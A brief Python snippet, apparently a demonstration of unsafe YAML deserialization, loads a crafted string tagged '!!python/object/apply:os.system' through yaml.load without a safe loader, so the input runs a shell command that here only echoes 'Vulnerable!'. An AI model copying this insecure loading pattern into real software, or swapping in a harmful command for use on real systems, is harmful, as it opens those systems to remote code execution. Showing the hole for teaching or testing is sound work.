import yaml

def load_yaml(yaml_input):
    data = yaml.load(yaml_input)
    return data

malicious_yaml = """
!!python/object/apply:os.system ['echo Vulnerable!']
"""

load_yaml(malicious_yaml)